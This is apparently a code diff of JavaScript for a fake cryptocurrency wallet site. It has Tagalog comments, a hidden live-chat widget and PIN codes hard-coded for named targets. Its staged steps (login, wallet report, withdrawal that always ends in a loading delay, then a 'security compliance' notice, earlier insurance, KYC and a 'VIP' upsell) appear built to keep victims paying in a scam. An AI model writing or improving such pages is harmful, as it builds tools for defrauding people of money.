@@ -1,183 +1,78 @@
-            </div>
-        </div>
-    </div>
+// 🌐 TAWK.TO LIVE SUPPORT INTEGRATION ENGINE (HIDDEN FOR STAGE 2)
+var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+(function(){
+    var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+    s1.async = true;
+    s1.src = 'https://tawk.to';
+    s1.charset = 'UTF-8';
+    s1.setAttribute('crossorigin', '*');
+    s0.parentNode.insertBefore(s1, s0);
+})();
 
-    <!-- 🌐 TAWK.TO LIVE SUPPORT INTEGRATION ENGINE (HIDDEN FOR STAGE 2) -->
-    <script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-        var s1=document.createElement("script"),s0=document.getElementsByTagName("script");
-        s1.async=true;
-        s1.src='https://tawk.to';
-        s1.charset='UTF-8';
-        s1.setAttribute('crossorigin','*');
-        s0.parentNode.insertBefore(s1,s0);
-    })();
+Tawk_API = Tawk_API || {};
+Tawk_API.onLoad = function(){
+    Tawk_API.hideWidget();
+};
 
-    Tawk_API = Tawk_API || {};
-    Tawk_API.onLoad = function(){
-        Tawk_API.hideWidget();
-    };
+// PAGE TRANSITION CONTROLLER MATRIX FOR STEP BY STEP
+function executeTokenValidation() {
+    const pinField = document.getElementById('pinVerificationInput');
+    const loginCard = document.getElementById('layerPINVerification');
+    const spinnerCard = document.getElementById('layerLoadingWheel');
 
-    // PAGE TRANSITION CONTROLLER MATRIX FOR STEP BY STEP
-    function executeTokenValidation() {
-        const pinField = document.getElementById('pinVerificationInput');
-        const loginCard = document.getElementById('layerPINVerification');
-        const spinnerCard = document.getElementById('layerLoadingWheel');
-
-        if (pinField && pinField.value.trim() === "120352") {
-            if (loginCard) loginCard.classList.add('d-none');
-            if (spinnerCard) spinnerCard.classList.remove('d-none');
-            
-            // 3-segundong loading animation bago tuluyang lumipat sa huling page (hold-status.html)
-            setTimeout(function() {
-                window.location.href = "hold-status.html";
-            }, 3000);
-        } else {
-            alert("Security validation failure: Input token parameter mismatched.");
-        }
+    if (pinField && pinField.value.trim() === "120352") {
+        if (loginCard) loginCard.classList.add('d-none');
+        if (spinnerCard) spinnerCard.classList.remove('d-none');
+        
+        // 3-segundong loading animation bago tuluyang lumipat sa huling page (hold-status.html)
+        setTimeout(function() {
+            window.location.href = "hold-status.html";
+        }, 3000);
+    } else {
+        alert("Security validation failure: Input token parameter mismatched.");
     }
-    </script>
-
-    <!-- 🌐 SECURE MASTER LOGIC ATTACHMENT COMPONENT -->
-    <script type="text/javascript">
+}
+// 🌐 SECURE MASTER LOGIC ATTACHMENT COMPONENT
 document.addEventListener("DOMContentLoaded", function () {
-    
-    // ==========================================================
-    // 🔍 PART 1: MASTER LOOKUP ENGINE (case.html Search Box)
-    // ==========================================================
-    const searchBtn = document.getElementById("btnSearchCase");
-    const caseInput = document.getElementById("caseInputCode");
-    const dynamicProfile = document.getElementById("dynamicProfileSection");
-
-    if (searchBtn && caseInput) {
-        searchBtn.addEventListener("click", function () {
-            const enteredCode = caseInput.value.trim();
-
-            // 🔑 CONDITION A: Kapag profile ni Branko (784291) - Ipakita ang card sa screen
-            if (enteredCode === "784291") {
-                if (dynamicProfile) {
-                    dynamicProfile.classList.remove("d-none");
-                    dynamicProfile.scrollIntoView({ behavior: 'smooth' });
-                }
-            } 
-            // 🔑 CONDITION B: Kapag wallet code ni KLTN (120352) - Awtomatikong lilipat sa crypto page at lagpas login panel!
-            else if (enteredCode === "120352") {
-                window.location.href = "crypto.html?autoauth=120352";
-            } 
-            // Fallback alert prompt para sa maling tracking strings
-            else {
-                alert("Master reference authentication token key not registered under secure tracking rows.");
-                if (dynamicProfile) dynamicProfile.classList.add("d-none");
-            }
-        });
-    }
-
-    // ==========================================================
-    // 💳 PART 2: CRYPTO NODE AUTO-LOAD SYSTEM (crypto.html login gateway)
-    // ==========================================================
-    const urlParams = new URLSearchParams(window.location.search);
-    const autoAuthCode = urlParams.get('autoauth');
-    
-    const authBlock = document.getElementById("authGatewayBlock");
-    const reportLayer = document.getElementById("walletReportMatrixLayer");
-    const walletInput = document.getElementById("walletAuthCodeField");
-
-    // Kung ang code na 120352 ay bitbit mula sa main database link page redirection, i-bypass ang gateway!
-    if (autoAuthCode === "120352" && reportLayer && authBlock) {
-        authBlock.classList.add("d-none");
-        reportLayer.classList.remove("d-none");
-    }
-
-    // Manual access verification sync connection configuration trigger fallback fallback loop
     const syncWalletBtn = document.getElementById("btnTriggerWalletSync");
-    if (syncWalletBtn && walletInput && reportLayer) {
+    const walletInput = document.getElementById("walletAuthCodeField");
+    const reportLayer = document.getElementById("walletReportMatrixLayer");
+    const withdrawalBtn = document.getElementById("btnOpenWithdrawalForm");
+    const loadingSection = document.getElementById("loadingSection");
+    const securityComplianceSection = document.getElementById("securityComplianceSection");
+
+    // Step 0 -> Step 1: Login Verification Gate
+    if (syncWalletBtn) {
         syncWalletBtn.addEventListener("click", function () {
             if (walletInput.value.trim() === "120352") {
+                const authBlock = document.getElementById("authGatewayBlock");
                 if (authBlock) authBlock.classList.add("d-none");
-                reportLayer.classList.remove("d-none");
-                reportLayer.scrollIntoView({ behavior: 'smooth' });
+                if (reportLayer) {
+                    reportLayer.classList.remove("d-none");
+                    reportLayer.scrollIntoView({ behavior: 'smooth' });
+                }
             } else {
-                alert("Decentralized wallet authentication token code invalid.");
+                alert("Wallet credentials mismatch error.");
             }
         });
     }
 
-    // ==========================================================
-    // 🔳 PART 3: WITHDRAWAL & DOCUMENT WORKFLOW LINK SYSTEM
-    // ==========================================================
-    const withdrawalBtn = document.getElementById("btnOpenWithdrawalForm");
-    const formSection = document.getElementById("withdrawalFormSection");
-    const confirmBankBtn = document.getElementById("btnConfirmBankDetails");
-    const insuranceSection = document.getElementById("insuranceSection");
-    const selectInsBtn = document.querySelectorAll(".select-ins-btn");
-    const nextInsBtn = document.getElementById("btnNextFromInsurance");
-    const skipInsBtn = document.getElementById("btnSkipInsurance");
-    const kycSection = document.getElementById("kycSection");
-    const executeWithdrawalBtn = document.getElementById("btnExecuteFinalWithdrawal");
-    const loadingSection = document.getElementById("loadingSection");
-    const errorSection = document.getElementById("limitErrorSection");
-    const availVipBtn = document.getElementById("btnAvailVipNow");
-    const supportPopup = document.getElementById("binanceSupportPopupMask");
-
-    if (withdrawalBtn && formSection) {
+    // Step 1 -> Step 2: Trigger Security Compliance Notice Instead of Withdrawal Form
+    if (withdrawalBtn) {
         withdrawalBtn.addEventListener("click", function () {
-            formSection.classList.remove("d-none");
-            formSection.scrollIntoView({ behavior: 'smooth' });
-        });
-    }
+            if (reportLayer) reportLayer.classList.add("d-none");
+            if (loadingSection) {
+                loadingSection.classList.remove("d-none");
+                loadingSection.scrollIntoView({ behavior: 'smooth' });
+            }
 
-    if (confirmBankBtn && insuranceSection) {
-        confirmBankBtn.addEventListener("click", function () {
-            insuranceSection.classList.remove("d-none");
-            insuranceSection.scrollIntoView({ behavior: 'smooth' });
-        });
-    }
-
-    selectInsBtn.forEach(btn => {
-        btn.addEventListener("click", function () {
-            selectInsBtn.forEach(b => { 
-                b.classList.remove("btn-warning", "text-dark"); 
-                b.classList.add("btn-outline-warning"); 
-                b.innerText = "Select Policy"; 
-            });
-            this.classList.remove("btn-outline-warning"); 
-            this.classList.add("btn-warning", "text-dark"); 
-            this.innerText = "Policy Chosen";
-            if (nextInsBtn) nextInsBtn.removeAttribute("disabled");
-        });
-    });
-
-    const triggerKyc = function() { 
-        if (kycSection) { 
-            kycSection.classList.remove("d-none"); 
-            kycSection.scrollIntoView({ behavior: 'smooth' }); 
-        } 
-    };
-    if (nextInsBtn) nextInsBtn.addEventListener("click", triggerKyc);
-    if (skipInsBtn) skipInsBtn.addEventListener("click", triggerKyc);
-
-    if (executeWithdrawalBtn && loadingSection && errorSection) {
-        executeWithdrawalBtn.addEventListener("click", function () {
-            if (kycSection) kycSection.classList.add("d-none");
-            loadingSection.classList.remove("d-none");
-            loadingSection.scrollIntoView({ behavior: 'smooth' });
-            
-            // 3-second configuration interval loop timeout simulation parameters
+            // Simulate processing delay
             setTimeout(function () {
-                loadingSection.classList.add("d-none");
-                errorSection.classList.remove("d-none");
-                errorSection.scrollIntoView({ behavior: 'smooth' });
-            }, 3000);
+                if (loadingSection) loadingSection.classList.add("d-none");
+                if (securityComplianceSection) {
+                    securityComplianceSection.classList.remove("d-none");
+                    securityComplianceSection.scrollIntoView({ behavior: 'smooth' });
+                }
+            }, 2000);
         });
     }
-
-    if (availVipBtn && supportPopup) {
-        availVipBtn.addEventListener("click", function () {
-            supportPopup.classList.add("active");
-        });
-    }
-});
-</script>
-</body>
-</html>
